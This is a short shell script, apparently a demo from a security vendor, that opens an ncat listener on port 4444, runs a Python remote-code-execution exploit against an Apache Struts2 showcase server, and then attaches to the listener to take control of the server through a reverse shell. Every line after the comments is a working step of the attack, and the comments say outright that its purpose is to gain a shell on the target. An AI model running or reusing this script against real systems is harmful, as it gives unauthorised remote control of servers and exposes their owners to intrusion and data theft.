# exploit.sh
# maintainer Neil Carpenter <neil@twistlock.com>
#
# Script will launch ncat to listen on port 4444
# Then, runs exploit code against the Struts2 server to create a reverse shell
# Finally, goes to the ncat screen so that you have control of the server
#
# Sleeps are there to fix an unknown timing issue -- without them
# the shell didn't connect and I got tired of
# trying to debug it.

screen -dmS ncat ncat -l -p 4444
sleep 10
python2 /struts2/strutsrce.py --target=http://struts.server:8080/showcase.action --ip=struts.client --port=4444
sleep 10
screen -r ncat